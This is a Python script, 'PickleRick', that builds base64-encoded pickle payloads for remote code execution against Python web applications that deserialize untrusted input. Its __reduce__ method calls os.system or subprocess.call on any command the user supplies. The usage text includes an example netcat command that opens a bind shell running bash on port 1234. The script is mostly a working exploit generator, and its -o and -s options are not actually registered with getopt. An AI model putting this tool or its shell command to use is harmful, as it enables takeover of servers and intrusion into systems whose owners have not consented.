#!/usr/bin/env python

import pickle
import base64
import getopt
import sys

cmd = ''
os = True
subprocess = False

def usage():
    print('PickleRick')
    print('Creates payloads for exploiting code execution in Python web applications that insecurely deserialize input with Pickle.')
    print('Note: Pickles code and then returns it base64 encoded. Can use the Python os or subprocess module based on your preference.')
    print('')
    print('Usage:')
    print('-h     help        Print this usage page')
    print('-p     payload     Command to be pickled')
    print('-o     os          Use Python os module (DEFAULT)')
    print('-s     subprocess  Use Python subprocess module')
    print('')
    print('Example:')
    print('python picklerick.py -p "netcat -c \'/bin/bash -i\' -l -p 1234"')

if not sys.argv[1:]:
    usage()
    sys.exit()

try:
    opts, args = getopt.getopt(sys.argv[1:], 'hp:', ['help', 'payload'])
except getopt.GetoptError as err:
    print(str(err))
    usage()
    sys.exit()

for o,a in opts:
    if o in ('-h', '--help'):
        usage()
        sys.exit()
    elif o in ('-p', '--payload'):
        cmd = a
    elif o in ('-o', '--os'):
        os = True
    elif o in ('-s', '--subprocess'):
        os = False
        subprocess = True

if subprocess == True:
    class Payload(object):
        def __reduce__(self):
            return(__import__('subprocess').call, (cmd,))
else:
    class Payload(object):
        def __reduce__(self):
            return(__import__('os').system, (cmd,))

if __name__ == '__main__':

    pickled = pickle.dumps(Payload())
    bytes = base64.b64encode(pickled)
    output = bytes.decode('ascii')

    print('Payload: ' + str(output))
